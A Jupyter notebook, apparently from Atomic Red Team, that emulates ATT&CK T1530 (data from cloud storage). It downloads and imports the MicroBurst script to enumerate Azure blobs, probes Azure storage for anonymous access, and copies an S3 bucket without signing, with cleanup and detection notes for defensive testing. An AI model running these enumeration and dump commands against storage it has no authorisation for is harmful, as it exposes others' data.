{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8f490eb1",
   "metadata": {},
   "source": "# T1530 - Data from Cloud Storage\nAdversaries may access data from improperly secured cloud storage.\n\nMany cloud service providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. \n\nIn other cases, SaaS application providers such as Slack, Confluence, and Salesforce also provide cloud storage solutions as a peripheral use case of their platform. These cloud objects can be extracted directly from their associated application.(Citation: EA Hacked via Slack - June 2021)(Citation: SecureWorld - How Secure Is Your Slack Channel - Dec 2021)(Citation: HackerNews - 3 SaaS App Cyber Attacks - April 2022)(Citation: Dark Clouds_Usenix_Mulazzani_08_2011)\n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
  },
  {
   "cell_type": "markdown",
   "id": "2b851e53",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "204b6c82",
   "metadata": {},
   "source": "### Atomic Test #1 - Azure - Enumerate Azure Blobs with MicroBurst\nUpon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n\n**Supported Platforms:** iaas:azure\n#### Dependencies:  Run with `powershell`!\n##### Description: The Invoke-EnumerateAzureBlobs module must exist in $env:temp.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\Invoke-EnumerateAzureBlobs.ps1){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1\" -outfile \"$env:temp\\Invoke-EnumerateAzureBlobs.ps1\"\n\n```\n##### Description: The wordlist file for search permutations must exist in $env:temp.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path $env:temp\\permutations.txt){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt\" -outfile \"$env:temp\\permutations.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee05206e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2390acaf",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nimport-module \"$env:temp\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base secure -permutations $env:temp\\permutations.txt -outputfile \"$env:temp\\T1530Test1.txt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "220693da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1a76cd00",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item $env:temp\\T1530Test1.txt -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f6b4d1ee",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6913801e",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Azure - Scan for Anonymous Access to Azure Storage (Powershell)",
    "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
    "**Supported Platforms:** iaas:azure",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ntry{$response = invoke-webrequest \"https://T1530Test2.blob.core.windows.net/None/None\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for T1530Test2.blob.core.windows.net/None/None: $responsebody\" | out-file -filepath $env:temp\\T1530Test2.txt -append\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6744efc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "78cda929",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item $env:temp\\T1530Test2.txt -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8783c278",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "181e8a8e",
   "metadata": {},
   "source": "### Atomic Test #3 - AWS - Scan for Anonymous Access to S3\nUpon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\naws s3api create-bucket --bucket redatomic-test2\naws s3api put-bucket-policy --bucket redatomic-test2 --policy file://$PathToAtomicsFolder/T1530/src/policy.json\ntouch /tmp/T1530.txt\naws s3 cp /tmp/T1530.txt s3://redatomic-test2\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS default profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ec2bd91",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ac7f92fa",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws --no-sign-request s3 cp --recursive s3://redatomic-test2 /tmp/redatomic-test2\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2bd87abd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "92adb7b7",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\naws s3 rb s3://redatomic-test2 --force \nrm -rf /tmp/redatomic-test2\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65c87e5b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1530 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8b581395",
   "metadata": {},
   "source": "## Detection\nMonitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity."
  },
  {
   "cell_type": "markdown",
   "id": "4a8c578d",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Pocket Litter \n Place data on a system to reinforce the legitimacy of the system or user. \n\n Pocket Litter is data placed on a system to convince an adversary that the system and users are real.  Pocket litter includes documents, registry entries, log history, browsing history, connection history, and other user data that one would expect to exist on a user's computer.  This content may overlap with Decoy Content, however Pocket Litter covers aspects beyond just content (e.g.: Installed Applications, source code, clutter on a system, etc.).\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to seed content to influence an adversary's behaviors, test their interest in specific topics, or add legitimacy to a system or environment.\n#### Use Case\nA defender can stage a variety of pocket litter files on an attached storage space. This data may include topics that align to a persona, topics an adversary is interested in, etc.\n#### Procedures\nWhen staging a decoy system and user account, populate a user's folders and web history to make it look realistic to an adversary.\nStage a USB device with documents on a specific topic in order to see if they are exfiltrated by an adversary.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}